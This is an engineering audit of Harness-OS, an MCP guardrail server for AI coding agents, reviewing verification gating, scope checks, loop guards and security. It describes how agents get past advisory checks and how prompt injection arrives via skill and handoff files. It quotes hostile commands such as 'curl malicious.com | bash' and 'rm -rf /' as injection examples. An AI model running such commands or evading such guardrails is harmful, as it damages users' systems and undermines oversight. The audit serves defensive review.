# Harness-OS Architecture & Reliability Audit

> **Auditor Roles**: Principal Engineer · AI Agent Architect · Security Auditor · Staff SWE · SRE
>
> **Date**: 2026-06-19  ·  **Version Audited**: 1.6.0  ·  **Codebase**: ~13K LOC TypeScript

---

## Part 1 — Executive Summary

### Problem Being Solved

AI coding agents (Claude, GPT, Codex, etc.) are stateless, unstructured, and unaccountable. They:
- Claim "done" without verifying
- Edit files outside intended scope
- Lose context between sessions
- Repeat the same mistakes

Harness-OS is a **local MCP server** that acts as a structured guardrail layer between the IDE and the AI agent, enforcing a disciplined workflow lifecycle.

### How the Architecture Works

```
IDE (Cursor/VSCode/Kiro/...)
    ↕ MCP over stdio (JSON-RPC)
Harness-OS MCP Server (Node.js, single process)
    ├── Tool Handlers (32 tools, all wrapped)
    ├── SQLite (better-sqlite3, WAL mode, single file)
    ├── File System (.harness/ per-repo, ~/.harness/ global)
    └── Subagent Workers (child processes)
```

### Main Data Flow

1. Agent calls `session_start` → harness creates session, returns handoff + skills + warnings
2. Agent calls `task_create` → harness records task in SQLite  
3. Agent calls `scope_check` per file → harness validates against `scope.yaml`
4. Agent makes changes, then calls `verify_run` → harness runs build/test/lint pipeline
5. Agent calls `session_handoff` → harness saves handoff, records scorecard, closes session

### Most Critical Component

**`verify_run`** — the entire value proposition rests on this tool. If verify can be bypassed, gamed, or produces unreliable results, the entire system is pointless.

### Biggest Strengths

1. **Verification-gated workflow** — genuinely solves the "agent claims done" problem
2. **Session continuity** — handoff/progress files prevent context loss across sessions
3. **Instinct learning** — 4-stage lifecycle (draft→candidate→shadow→promoted) is well-designed
4. **Defensive programming** — wrapTool never throws, circuit breaker + loop guard are solid
5. **Low dependency footprint** — only 4 runtime deps (MCP SDK, better-sqlite3, picomatch, zod)

---

## Part 2 — Assumption Audit

### Technical Assumptions

| # | Assumption | Valid? | Risk Level | Notes |
|---|-----------|--------|------------|-------|
| T1 | Agent always calls tools in correct order | ❌ No | 🔴 High | Agents frequently skip steps. The 11-step workflow in AGENTS.md is aspirational, not enforced. `session_handoff` warns if `verify_run` wasn't called, but doesn't block. |
| T2 | `execSync` in verify_run is safe | ⚠️ Partial | 🔴 High | Commands come from `verify.yaml` (trusted), but `subagent_invoke` passes arbitrary commands to `execSync` with `shell: true`. No sanitization. |
| T3 | Loop guard catches all agent loops | ⚠️ Partial | 🟡 Medium | Only catches identical args within 60s. Agent can vary args slightly to bypass. Doesn't detect semantic loops (same intent, different params). |
| T4 | SQLite is reliable as sole data store | ✅ Mostly | 🟡 Medium | WAL mode is good. But no backup strategy. Corruption = total state loss. Process crash during write could leave WAL incomplete. |
| T5 | Git is always available | ⚠️ Partial | 🟡 Medium | `getChangedFiles`, `getRepoStateHash` call `git` via `execSync`. Non-git repos will silently fail and return empty results — verify cache will never work. |
| T6 | Scope enforcement prevents wrong edits | ❌ No | 🔴 High | `scope_check` is **advisory only**. The MCP server returns `in_scope: false` but doesn't actually prevent the IDE/agent from editing the file. It relies entirely on the agent obeying the response. |
| T7 | MCP transport (stdio) is reliable | ✅ Yes | 🟢 Low | Stdio is simple and works. Main risk is stdout corruption from accidental `console.log`, which the codebase guards against. |
| T8 | Single-process architecture handles the load | ✅ Yes | 🟢 Low | For 1-10 users on local machines, single-process SQLite is perfectly fine. |

### User Assumptions

| # | Assumption | Valid? | Risk Level | Notes |
|---|-----------|--------|------------|-------|
| U1 | Operators configure `.harness/` correctly | ⚠️ Partial | 🟡 Medium | Custom YAML parsers are fragile. No schema validation on `scope.yaml` or `verify.yaml` at parse time. Silent failures. |
| U2 | AGENTS.md is always read by agents | ❌ No | 🔴 High | This is the core paradox: the system designed to make agents follow rules depends on agents reading rules. Not all IDE integrations inject AGENTS.md into context. |
| U3 | Users won't abuse `subagent_invoke` | ⚠️ Partial | 🟡 Medium | Any agent can run arbitrary shell commands via `subagent_invoke` with `shell: true`. |

### Operational Assumptions

| # | Assumption | Valid? | Risk Level | Notes |
|---|-----------|--------|------------|-------|
| O1 | Runs on Windows (primary target) | ✅ Yes | 🟢 Low | Codebase handles `\\` path normalization. But `execSync` uses shell commands that might not work on all Windows shells. |
| O2 | No concurrent MCP server instances | ⚠️ Partial | 🟡 Medium | Multiple IDEs could each spawn their own MCP server instance. SQLite WAL handles concurrent reads, but concurrent writes to the same DB from multiple processes could cause `SQLITE_BUSY`. |
| O3 | Disk space is unlimited | ⚠️ Partial | 🟡 Medium | Audit JSONL grows indefinitely. Rotation exists at 10MB, but compressed backups accumulate forever. SQLite has no cleanup. |

---

## Part 3 — Architecture Review

### Maintainability — Score: 7/10

**Positives:**
- Clean module separation (tools/ vs lib/ vs db/)
- Consistent error handling pattern (never throw, return `{ error }`)
- Colocated tests (`*.test.ts` next to source)
- Good use of TypeScript interfaces

**Issues:**
- [index.ts](file:///d:/MyProject/harness_operator_system/src/index.ts) is 805 lines — an 800-line registration file. Every tool registration requires touching this monolithic file.
- Custom YAML parsers in [hooks.ts](file:///d:/MyProject/harness_operator_system/src/lib/hooks.ts), [verify.ts](file:///d:/MyProject/harness_operator_system/src/tools/verify.ts), and [scope.ts](file:///d:/MyProject/harness_operator_system/src/tools/scope.ts) — three separate hand-rolled parsers for the same format. This is a DRY violation and a bug magnet.
- `any` types scattered throughout (e.g., `result?: any` in [subagent.ts:18](file:///d:/MyProject/harness_operator_system/src/tools/subagent.ts#L18), `payload: any` in [trace-analyzer.ts:11](file:///d:/MyProject/harness_operator_system/src/lib/trace-analyzer.ts#L11))
- Database schema in one giant `db.exec()` block — no versioned migrations

### Extensibility — Score: 6/10

**Positives:**
- Skills system is pluggable (just add a markdown file)
- Hook system allows custom rules
- Variant system for different behavior profiles

**Issues:**
- Adding a new tool requires touching 4 files (tool module, index.ts, smoke test, docs) — high ceremony
- No plugin architecture for custom tools
- Skill matcher is keyword-based only — can't handle semantic similarity
- [instinct.ts](file:///d:/MyProject/harness_operator_system/src/tools/instinct.ts) at 526 lines is becoming a god module

### Reliability — Score: 6/10

**Single Points of Failure:**
1. **SQLite file** — corruption = total data loss. No backup mechanism.
2. **Stdio transport** — any stdout write kills MCP. One `console.log` buried in a dependency = dead server.
3. **Process crash** — all in-memory state (loop guard, circuit breaker) is lost.

**Failure Propagation:**
- `auditLog()` is called inside `wrapTool()`. If SQLite is corrupt, every tool call fails. There's a try/catch in the wrapper, but `auditLog()` is called before the actual handler. A failure in audit could propagate.
- `checkPreToolHooks()` reads `hooks.yaml` from disk on every single tool call. FS errors propagate to tool blocking.

**Recovery:**
- Orphaned sessions are auto-closed on next `session_start` ✅
- No database repair mechanism
- No health check that validates DB integrity (the `doctor` CLI exists but doesn't PRAGMA integrity_check)

---

## Part 4 — Agent Reliability Audit

| # | Failure Mode | Impact | Probability | Severity | Mitigation |
|---|-------------|--------|-------------|----------|-----------|
| A1 | **Agent skips verify_run** | False "done" claim. Core value proposition broken. | 🔴 High | 🔴 Critical | Warning in handoff only. `stop_validation` hook exists but requires manual config in `hooks.yaml`. Should be **default-on**. |
| A2 | **Agent skips session_start** | No session ID → handoff fails → all progress lost | 🟡 Medium | 🔴 Critical | No detection. Tools work without session context (fallback to "global"). Should refuse most tools if no active session. |
| A3 | **Agent loops with varying args** | Loop guard bypassed. Token waste. | 🟡 Medium | 🟡 Medium | Loop guard hashes args with MD5. Slight variation = different hash = bypass. Need semantic deduplication or rate limiting per tool (regardless of args). |
| A4 | **Context window overflow** | Agent loses track of workflow state | 🔴 High | 🟡 Medium | `session_start` returns a lot of data (handoff + skills + tasks + instincts + warnings). Can easily consume 4K+ tokens. `strategic-compact` skill exists but is advisory. |
| A5 | **Agent edits files outside scope** | Scope violation. Wrong files modified. | 🟡 Medium | 🔴 Critical | `scope_check` is advisory-only. Does NOT prevent edits. Agent can ignore the response. No integration with IDE file permissions. |
| A6 | **Agent calls destructive commands via subagent_invoke** | Data loss, system damage | 🟢 Low | 🔴 Critical | Commands run with `shell: true` and no sanitization. `rm -rf /` is technically possible. Only scope_check on context_files, not on commands. |
| A7 | **Hallucinated session/task IDs** | DB corruption, orphaned records | 🟡 Medium | 🟡 Medium | No strict validation that session_id exists before tool calls reference it. Random UUIDs make collision unlikely but hallucination possible. |
| A8 | **Agent deadlock between verify_run and stop_validation** | Session can never close | 🟢 Low | 🟡 Medium | If `stop_validation` requires verify to pass, but verify always fails (e.g., broken test), the agent is stuck forever. No escape hatch. |
| A9 | **Recursive planning** | Token waste, no progress | 🟡 Medium | 🟡 Medium | No detection of "agent is planning about planning". Skills like `brainstorming` + `design-grilling` could chain indefinitely. |
| A10 | **Concurrent sessions on same repo** | Data corruption, conflicting state | 🟡 Medium | 🟡 Medium | `session_start` auto-closes orphaned sessions, which could kill a legitimately active parallel session from another IDE window. |
| A11 | **verify_run cache poisoning** | Cached "pass" result served when code has actually changed | 🟢 Low | 🔴 Critical | Cache key is `git rev-parse HEAD + git status`. If git index is stale, cache could serve wrong results. Manual `--force-install` exists but not `--no-cache`. |

---

## Part 5 — MCP Architecture Review

### Tool Design Analysis

#### Advisory Tools (Safe — read-only)
| Tool | Verdict | Notes |
|------|---------|-------|
| `skill_load` | ✅ Keep | Read-only, well-scoped |
| `skill_list` | ✅ Keep | Read-only |
| `skill_suggest` | ✅ Keep | Read-only |
| `scope_get` | ✅ Keep | Read-only |
| `scope_check` | ✅ Keep | Read-only |
| `handoff_read` | ✅ Keep | Read-only |
| `harness_status` | ✅ Keep | Read-only |
| `repo_summary_read` | ✅ Keep | Read-only, auto-generates |
| `code_search_grep` | ✅ Keep | Read-only, size-limited |
| `code_search_symbols` | ✅ Keep | Read-only, size-limited |
| `instinct_get` | ⚠️ Side-effect | Updates reference_count and confidence on query. A "get" shouldn't mutate. |
| `task_list` | ✅ Keep | Read-only |
| `reflection_run` | ✅ Keep | Read-only analysis |
| `aegis_analyze` | ✅ Keep | Read-only analysis |

#### Execution Tools (State-mutating)
| Tool | Verdict | Notes |
|------|---------|-------|
| `session_start` | ✅ Keep | Creates session, auto-closes orphans |
| `session_resume` | ⚠️ Redundant | Literally `return sessionStart(...)`. Delete and use `session_start` only. |
| `session_end` | ✅ Keep | |
| `session_handoff` | ✅ Keep | Atomic handoff+progress+close |
| `task_create` | ✅ Keep | |
| `task_update` | ✅ Keep | |
| `progress_log` | ✅ Keep | |
| `handoff_write` | ⚠️ Redundant | `session_handoff` already writes handoff. Having both creates confusion. |
| `audit_log` | ⚠️ Unnecessary as agent-facing | Audit is already auto-logged by wrapTool. Exposing it to agents just adds noise. |
| `instinct_add` | ✅ Keep | |
| `instinct_record_outcomes` | ✅ Keep | |
| `instinct_promote` | ✅ Keep | Has regression gate |
| `instinct_prune` | ✅ Keep | Has dry_run safety |
| `instinct_evolve` | ✅ Keep | Generates skill drafts |
| `skill_create_from_session` | ✅ Keep | Draft only, no auto-save |
| `aegis_propose` | ✅ Keep | Creates proposals for review |

#### Dangerous Tools
| Tool | Risk | Recommendation |
|------|------|----------------|
| `verify_run` | 🟡 Medium | Runs arbitrary commands via `execSync`. Commands from `verify.yaml` (trusted) or auto-detected. OK with current design. |
| `subagent_invoke` | 🔴 High | Runs arbitrary shell commands with `shell: true` and no sanitization. **This is the most dangerous tool.** Should have: command allowlist, no `shell: true`, output sandboxing. |

### Tools That Should Be Removed or Merged

1. **`session_resume`** → Delete. It's literally `return sessionStart(...)`.
2. **`handoff_write`** → Deprecate. `session_handoff` does this atomically.
3. **`audit_log`** → Remove from agent-facing tools. Keep as internal-only. Agents don't need to manually log audits — `wrapTool` already does it.

### Tools That Need Splitting

1. **`instinct_get`** → Split into `instinct_query` (read-only) and `instinct_reference` (mutating). Current `instinct_get` has write side-effects (updates confidence, reference_count).

---

## Part 6 — Security Review

### Prompt Injection Risk

| # | Risk | Severity | Exploitability | Fix |
|---|------|----------|----------------|-----|
| S1 | Skill content injected into context | 🟡 Medium | 🟡 Medium | Skills are markdown files loaded from `skills/` dir. If a repo has a custom `.harness/skills/` dir, a malicious repo could inject arbitrary instructions. No sanitization. |
| S2 | Handoff data injected | 🟡 Medium | 🟡 Medium | `handoff_last.json` contents are returned to agent at session_start. A malicious previous session could plant instructions in `next_steps`. |
| S3 | `never_again.md` injection | 🟢 Low | 🟡 Medium | Content from `.harness/never_again.md` is returned verbatim. Could contain prompt injection if an attacker controls this file. |

### Tool Abuse Risk

| # | Risk | Severity | Exploitability | Fix |
|---|------|----------|----------------|-----|
| S4 | **Command injection via `subagent_invoke`** | 🔴 Critical | 🔴 High | `commands` array passed to `execSync` with `shell: true`. Agent can run `curl malicious.com | bash`, `rm -rf /`, etc. **Fix: Remove `shell: true`. Whitelist allowed commands. Add command pattern blocking.** |
| S5 | ReDoS via `code_search_grep` | 🟡 Medium | 🟡 Medium | User-provided regex passed to `new RegExp(query)`. Catastrophic backtracking possible. **Fix: Add regex complexity check or timeout.** |
| S6 | ReDoS via `hooks.yaml` pattern | 🟡 Medium | 🟢 Low | Hook patterns from `hooks.yaml` compiled as regex with `new RegExp(rule.pattern, "i")`. Validated only by `validateHooksConfig`, which is opt-in. |

### File System Risk

| # | Risk | Severity | Exploitability | Fix |
|---|------|----------|----------------|-----|
| S7 | Path traversal in `scope_check` | ✅ Mitigated | — | Good: checks `relFile.startsWith("../")`. |
| S8 | Verify cache writes to `.harness/` | 🟢 Low | 🟢 Low | Writes `verify_cache.json`, `lockfile_hash.txt`. Not exploitable but could fill disk. |
| S9 | Audit JSONL growth | 🟡 Medium | — | 10MB rotation exists but backups accumulate forever. No `maxBackups` limit. |

### Secrets Risk

| # | Risk | Severity | Exploitability | Fix |
|---|------|----------|----------------|-----|
| S10 | Secret redaction is key-name only | 🟡 Medium | 🟡 Medium | `redactSecrets()` only checks key names matching `/token|secret|password|.../`. Won't catch secrets in values (e.g., `Bearer eyJ...` in a random field). |
| S11 | Audit JSONL may contain secrets | 🟡 Medium | 🟡 Medium | Tool args are logged in verbose mode. If agent passes secrets as tool args, they're stored in plaintext in `~/.harness/audit.jsonl`. |
| S12 | `verify_run` output may contain env vars | 🟡 Medium | 🟢 Low | Build/test output could contain env vars printed by the build system. Stored in step_results and evidence files without redaction. |

---

## Part 7 — Context Engineering Review

### Context Waste

| Source | Token Cost | Value | Verdict |
|--------|-----------|-------|---------|
| `session_start.relevant_knowledge` (5 instincts) | ~500 tokens | 🟡 Medium | Often irrelevant. Fuzzy matching based on task title is noisy. Should only include if match score > threshold. |
| `session_start.applicable_skills` (tier 1 list) | ~100 tokens | 🟢 High | Names only, compact. Good. |
| `session_start.suggested_skills` (top 3) | ~200 tokens | 🟢 High | Useful for guidance. |
| `session_start.last_handoff` (full JSON) | ~500-2000 tokens | 🟢 High | Essential for continuity. But could be compressed. |
| `verify_run` output (8KB max) | ~2000 tokens | ⚠️ Variable | Often contains redundant build output. Step results duplicate the summary. |
| `skill_load` content (full markdown) | ~1000-3000 tokens | 🟡 Medium | Skill content is loaded repeatedly across sessions. Agent context windows don't benefit from re-reading identical skills. |
| AGENTS.md (16KB) | ~4000 tokens | 🔴 Waste on repeat | This file is injected every conversation but rarely needs re-reading after the first session. |

### Missing Context

| What's Missing | Impact | Fix |
|---------------|--------|-----|
| **Diff preview before verify** | Agent can't see what changed before running verify | Add `changed_files` to verify output (partially done for lint, not for all steps) |
| **Previous session's verify results** | Agent doesn't know what failed last time | Include in handoff data |
| **Time estimates for verify steps** | Agent can't plan timeout expectations | Track historical step durations in scorecards |
| **Instinct hit/miss explanation** | Agent doesn't know why an instinct was suggested | Include match score breakdown |

### Compression Opportunities

| Opportunity | Estimated Savings | Effort |
|-------------|------------------|--------|
| Compress skill_load output for already-loaded skills (return "already loaded" summary) | ~2000 tokens/session | Low |
| Trim verify_run output to only failed steps (skip PASS details) | ~1000 tokens | Low |
| Make handoff summary max 500 chars | ~500 tokens | Low |
| Don't return full instinct records in session_start; just IDs + descriptions | ~300 tokens | Low |

### Memory Design Assessment

- **Adequate**: Handoff + progress files provide good cross-session memory
- **Redundant**: Instincts are stored in DB AND referenced in session_instinct_refs AND recorded in instinct_outcomes — three places
- **Hallucination risk**: Low. Data comes from SQLite, not generated. But fuzzy instinct matching could surface irrelevant instincts that confuse the agent.

---

## Part 8 — Technical Debt Radar

| Component | Debt Level | Risk | Estimated Fix Cost |
|-----------|-----------|------|-------------------|
| Custom YAML parsers (×3) | 🔴 High | Parser bugs, inconsistent behavior | 2-3 days (replace with a proper YAML parser or consolidate) |
| [index.ts](file:///d:/MyProject/harness_operator_system/src/index.ts) monolith (805 lines) | 🟡 Medium | Every tool change requires touching this file | 1-2 days (auto-registration from tool modules) |
| No database migrations versioning | 🟡 Medium | Schema drift, hard to rollback | 2-3 days |
| `any` types in 10+ locations | 🟡 Medium | Runtime errors, unsafe casts | 1 day |
| In-memory loop/circuit state (lost on restart) | 🟡 Medium | Protection resets after crash | 1 day (persist to SQLite) |
| `session_resume` = `session_start` duplicate | 🟢 Low | Confusion, wasted tool slot | 30 min |
| `instinct_get` has write side-effects | 🟡 Medium | Violates query/command separation | 1 day |
| Audit JSONL unbounded backup growth | 🟡 Medium | Disk usage | 2 hours |
| No structured error codes | 🟡 Medium | Agents can't programmatically handle errors | 1-2 days |
| `subagent_invoke` with `shell: true` | 🔴 High | Security vulnerability | 1 day |
| Scope enforcement is advisory-only | 🔴 High | Core feature doesn't actually prevent violations | Complex (requires IDE-level integration) |

---

## Part 9 — Performance Review

### CPU

- **Most expensive**: `code_search_grep` and `code_search_symbols` — synchronous file traversal with `readdirSync` + `readFileSync` + regex matching on every file. For large repos (10K+ files), this blocks the event loop for seconds.
- **Fix priority**: 🟡 Medium — Replace with `child_process` call to `ripgrep` or use worker threads.

### Memory

- **Loop guard Map** and **circuit breaker Map** grow unbounded in long-running sessions. No eviction.
- **Scope matcher cache** (`matcherCache`) in [scope.ts](file:///d:/MyProject/harness_operator_system/src/tools/scope.ts#L7) also grows unbounded.
- **Fix priority**: 🟢 Low — add LRU or periodic cleanup.

### Network

- No network calls in the codebase. ✅ Clean.

### LLM Usage (Token Consumption)

- **Most expensive**: `skill_load` returning full skill markdown every call (~2K tokens each)
- **Second**: `session_start` returning full handoff + instincts + skills (~3-5K tokens)
- **Fix priority**: 🟡 Medium — implement "already loaded" cache at skill level.

### File Operations

- **Most expensive**: `verify_run` — calls `execSync` for each step. Build/test can take 30-120s.
- `hooks.yaml` is re-read from disk on EVERY tool call via `checkPreToolHooks`. No caching beyond file mtime for scope.yaml (hooks.yaml has no cache at all).
- **Fix priority**: 🟡 Medium — cache hooks.yaml with mtime check like scope.yaml.

### Top Bottleneck

`verify_run` with `execSync` is synchronous and blocks the entire MCP server for the duration of build/test/lint. During a 60-second test run, ALL other tool calls are blocked.

> [!CAUTION]
> **This is the #1 performance problem.** The MCP server is single-threaded. `execSync` in verify_run blocks everything. If an IDE sends a status check while tests are running, it will time out.

---

## Part 10 — Comparative Analysis

### vs Claude Code (Anthropic)

| Aspect | Harness-OS | Claude Code | Verdict |
|--------|-----------|-------------|---------|
| Verification enforcement | ✅ Better — explicit verify pipeline | ❌ No built-in | Harness wins |
| Scope enforcement | ⚠️ Advisory only | ✅ Permission system | Claude Code wins |
| Memory across sessions | ✅ Handoff system | ❌ No memory | Harness wins |
| Tool orchestration | ⚠️ 32 tools, complex | ✅ Simpler, fewer tools | Claude Code wins |
| IDE integration | ✅ 8 IDEs via MCP | ❌ Claude Code only | Harness wins |

### vs Codex CLI (OpenAI)

| Aspect | Harness-OS | Codex CLI | Verdict |
|--------|-----------|-----------|---------|
| Sandboxing | ❌ No sandboxing | ✅ Docker sandbox | Codex wins |
| Learning system | ✅ Instinct lifecycle | ❌ No learning | Harness wins |
| Scope enforcement | ⚠️ Advisory | ✅ File-level control | Codex wins |
| Cross-session context | ✅ Handoff + progress | ❌ Stateless | Harness wins |

### vs OpenHands

| Aspect | Harness-OS | OpenHands | Verdict |
|--------|-----------|-----------|---------|
| Execution model | Single MCP server | Docker-based agent runtime | Different approach |
| Verification | ✅ Built-in pipeline | ⚠️ Agent decides | Harness wins |
| Complexity | 🟢 13K LOC | 🔴 Much larger | Harness wins |
| Agentic autonomy | Limited by tools | Full autonomous execution | OpenHands more capable |

### vs Aider

| Aspect | Harness-OS | Aider | Verdict |
|--------|-----------|-------|---------|
| Focus | Process guardrails | Code editing UX | Different goals |
| Git integration | ✅ Diff-based verify | ✅ Auto-commit | Both good |
| Learning | ✅ Instinct system | ❌ No learning | Harness wins |
| Simplicity | 🟡 32 tools | ✅ CLI-first | Aider simpler |

### Ideas Worth Borrowing

| From | Idea | Priority |
|------|------|----------|
| Codex CLI | **Docker sandboxing for verify/subagent** | Must Have |
| Claude Code | **Permission-based scope enforcement** (actually prevents edits) | Must Have |
| Aider | **Auto-commit on verify pass** | Nice To Have |
| OpenHands | **Event stream architecture** (instead of blocking execSync) | Nice To Have |
| General | **Structured output schemas for tool responses** (not free-form JSON) | Nice To Have |
| General | **Rate limiting per minute** (not just same-args loop detection) | Must Have |

### Not Worth Implementing

| Idea | Why Not |
|------|---------|
| Full Docker runtime for all tools | Overkill for local MCP server. Adds massive complexity. |
| Web UI dashboard | Scope creep. CLI + IDE integration is sufficient. |
| Multi-agent coordination protocol | Premature. Single-agent use case isn't mature yet. |
| Cloud-hosted version | Violates local-first principle and adds security concerns. |

---

## Part 11 — Improvement Opportunities

### Quick Wins (1-3 days)

| # | Improvement | Impact | Effort | ROI |
|---|-----------|--------|--------|-----|
| Q1 | Cache `hooks.yaml` with mtime check (like `scope.yaml`) | Eliminates disk read per tool call | 2 hours | 🔴 Very High |
| Q2 | Remove `session_resume` (alias of `session_start`) | Reduce tool surface, eliminate confusion | 30 min | 🟢 High |
| Q3 | Make `stop_validation` default-on when hooks.yaml exists | Prevent agents from skipping verify | 1 hour | 🔴 Very High |
| Q4 | Add `--no-cache` flag to `verify_run` | Allow forced re-verification | 1 hour | 🟡 Medium |
| Q5 | Remove `shell: true` from `subagent_invoke` spawn | Close command injection vulnerability | 2 hours | 🔴 Very High |
| Q6 | Add max-backups limit to audit rotation | Prevent disk exhaustion | 1 hour | 🟡 Medium |
| Q7 | Separate `instinct_get` read side-effects | Clean CQRS violation | 3 hours | 🟡 Medium |

### Short-Term (1-2 weeks)

| # | Improvement | Impact | Effort | ROI |
|---|-----------|--------|--------|-----|
| S1 | Replace custom YAML parsers with a single parser module (or use `js-yaml`) | Eliminate 3 parser bugs, reduce maintenance | 3 days | 🔴 Very High |
| S2 | Make `verify_run` async (use `spawn` instead of `execSync`) | Unblock MCP server during tests | 3-5 days | 🔴 Very High |
| S3 | Add structured error codes to all tool responses | Enable agents to handle errors programmatically | 2-3 days | 🟡 Medium |
| S4 | Persist loop guard + circuit breaker state in SQLite | Survive process restarts | 2 days | 🟡 Medium |
| S5 | Add database integrity check to `doctor` CLI | Detect corruption early | 1 day | 🟡 Medium |
| S6 | Auto-register tools from module exports (remove index.ts boilerplate) | Reduce ceremony for adding tools | 3 days | 🟡 Medium |

### Medium-Term (1-2 months)

| # | Improvement | Impact | Effort | ROI |
|---|-----------|--------|--------|-----|
| M1 | Implement database backup strategy (periodic SQLite backup) | Prevent total state loss | 1 week | 🟡 Medium |
| M2 | Replace `code_search_grep` with ripgrep subprocess | 10-100x performance for large repos | 1 week | 🟡 Medium |
| M3 | Add command allowlist/blocklist for `subagent_invoke` | Proper security boundary | 1 week | 🔴 Very High |
| M4 | Implement versioned database migrations | Safe schema evolution | 2 weeks | 🟡 Medium |
| M5 | Add telemetry/metrics (optional, opt-in) | Understand real usage patterns | 2 weeks | 🟡 Medium |

---

## Part 12 — Forced Prioritization

If I maintain this project for 3 years and can only make 5 changes:

### 1. Make `verify_run` non-blocking (async)

**Why**: This is the #1 operational problem. `execSync` blocks the entire MCP server for 30-120 seconds during every verification. This makes the server unresponsive and creates terrible UX. It will compound as repos grow and test suites get larger.

**ROI**: Very high. Affects every single verify call.  
**Risk if not done**: Server becomes unusable for repos with test suites > 30s.  
**Opportunity cost**: None — this is foundational infrastructure.

### 2. Close the `subagent_invoke` command injection vulnerability

**Why**: `shell: true` + arbitrary commands = remote code execution. This is a security-critical bug. It's only a matter of time before an agent is tricked into running destructive commands.

**ROI**: Infinite (prevents catastrophic failure).  
**Risk if not done**: Data loss, credential theft, system compromise.  
**Opportunity cost**: Low — straightforward fix.

### 3. Replace custom YAML parsers with a proper parser

**Why**: Three hand-rolled YAML parsers is the biggest maintenance liability. They handle happy-path cases but will break on edge cases (multi-line values, special characters, nested structures). Every bug requires fixing in 3 places.

**ROI**: High — reduces bug surface area by ~300 lines of fragile code.  
**Risk if not done**: Silent misparses of scope.yaml/verify.yaml/hooks.yaml causing incorrect behavior.  
**Opportunity cost**: Adds one dependency (~50KB).

### 4. Make verify enforcement default-on (not opt-in)

**Why**: The entire value proposition is "agents must verify before claiming done." But verify enforcement via `stop_validation` is opt-in in `hooks.yaml`. Most users won't configure it. This means the default experience is the old, broken behavior.

**ROI**: Very high — aligns default behavior with stated mission.  
**Risk if not done**: Core promise is unfulfilled for majority of users.  
**Opportunity cost**: May annoy users who want quick sessions — mitigated by `quick` option.

### 5. Add database backup and integrity checking

**Why**: SQLite is the single point of failure for all state. Corruption = total loss of sessions, tasks, instincts, scorecards. Over 3 years, this WILL happen at least once (power failure, disk error, concurrent write from multiple IDE instances).

**ROI**: Medium per occurrence, but guaranteed to be needed.  
**Risk if not done**: Irreversible state loss.  
**Opportunity cost**: Minimal — periodic copy of a single file.

---

## Part 13 — Critical Feedback

### Điều gì đang làm tốt?

1. **Verification pipeline** — Verify_run is genuinely useful. Caching with lockfile hash and repo state is smart engineering.
2. **Instinct lifecycle** — The 4-stage promotion pipeline (draft→candidate→shadow→promoted) with regression gates is genuinely novel and well-designed. I haven't seen this in any competitor.
3. **Error handling discipline** — Never-throw pattern + wrapTool decorator is excellent. The codebase is remarkably crash-resistant.
4. **Low dependency footprint** — 4 runtime dependencies. This is rare discipline.
5. **Orphan session recovery** — Auto-detecting and closing orphaned sessions is a thoughtful touch.

### Điều gì đang làm sai?

1. **Scope enforcement is theater.** `scope_check` returns a JSON response saying "out of scope" but NOTHING PREVENTS the agent from editing the file. This is a guardrail with no guard and no rail. It's a polite suggestion disguised as enforcement.
2. **`execSync` everywhere.** Verify_run, subagent_invoke, code_search — all synchronous. This blocks the MCP server. In 2026, synchronous I/O in a server is unacceptable.
3. **Three hand-rolled YAML parsers.** This is the definition of tech debt. Each parser handles a slightly different subset of YAML and will break differently on edge cases.

### Điều gì cần sửa ngay?

1. **`subagent_invoke` with `shell: true`** — This is a live security vulnerability. Remove `shell: true` today.
2. **`instinct_get` mutates on read** — A "get" function that silently updates confidence and reference_count violates every principle of predictable API design.
3. **No verify enforcement by default** — The tool's entire raison d'être is verification, but it's opt-in.

### Điều gì đang bị over-engineered?

1. **AEGIS system** (trace-analyzer + aegis-lite) — 350+ lines of analysis code that generates "signals" nobody acts on. The proposals table exists but there's no approval workflow. This is unused infrastructure.
2. **Scorecard system** — Records 10+ metrics per session but has no consumer. The analytics.ts file exists but nothing presents the data meaningfully.
3. **Instinct evolve** — Generates skill drafts from instinct clusters, but the output is a basic markdown template. The sophistication of the selection algorithm doesn't justify the simplicity of the output.
4. **32 skills** — Many skills overlap. `harness-workflow` + `strategic-compact` + `karpathy-guidelines` all say variations of "think before coding." Three skills where one would suffice.

### Điều gì đang bị under-engineered?

1. **Scope enforcement** — Advisory-only is insufficient. Need real enforcement.
2. **Database resilience** — No backups, no integrity checks, no WAL checkpoint management.
3. **Error reporting** — Free-form `{ error: "string" }` with no error codes. Agents can't distinguish "file not found" from "permission denied" from "circuit breaker open."
4. **Command security** — No sanitization, no allowlists, no sandboxing for `subagent_invoke`.
5. **Hooks config caching** — Re-reads from disk every tool call.

### Nếu đây là dự án của tôi?

I would:
1. **Kill 10 of the 32 skills** — consolidate overlapping ones, remove unused ones
2. **Remove AEGIS entirely** until there's a real consumer for the signals
3. **Make the codebase async-first** — replace all `execSync` with `spawn` + promises
4. **Add a proper YAML parser** (js-yaml is 60KB, battle-tested)
5. **Implement real scope enforcement** via filesystem permissions or IDE integration hooks
6. **Default verify enforcement to ON** — make the core feature actually work out of the box
7. **Add a simple SQLite backup** (copy on session_start) 
8. **Cut index.ts** to under 100 lines via auto-registration

---

## Part 14 — Final Score

| Category | Score /10 | Rationale |
|----------|-----------|-----------|
| **Architecture** | 6 | Solid module separation, but monolithic index.ts, blocking I/O, and single-threaded design limit it. No plugin system. |
| **Reliability** | 5 | Defensive error handling is excellent. But SQLite as SPoF without backup, blocking verify, and advisory-only scope enforcement drop the score. |
| **Security** | 4 | `subagent_invoke` with `shell: true` is a critical vulnerability. Secret redaction is shallow. No command sandboxing. Regex injection possible. |
| **Maintainability** | 7 | Clean TypeScript, colocated tests, good naming. Dragged down by 3 custom YAML parsers, 800-line index.ts, and scattered `any` types. |
| **Extensibility** | 6 | Skills are pluggable. But adding a tool requires touching 4+ files. No plugin API. Skill matching is keyword-only. |
| **Developer Experience** | 7 | Good CLI, good docs (Vietnamese!), good quick-start. Smoke test is excellent. But the 11-step mandatory workflow in AGENTS.md is intimidating and fragile. |
| **Cost Efficiency** | 7 | Low dependencies, local-only, no cloud costs. Context waste from verbose tool outputs reduces token efficiency. |
| **Simplicity** | 5 | 32 tools, 32 skills, 11-step workflow, 4-stage instinct lifecycle, AEGIS analysis, scorecards, reflection... The system is trying to solve too many problems at once. The core (verify + scope + session) is simple; everything else adds cognitive load. |

---

# Overall Score: 47 / 80 (58.75%)

> **Rating: Promising but needs hardening.**

The core insight — structured guardrails for AI agents via MCP — is valuable and well-timed. The verify pipeline and instinct learning system are genuine innovations. But the codebase has grown faster than its security and reliability foundations. The most critical issues are:

1. 🔴 **Command injection via `subagent_invoke`** — Fix immediately
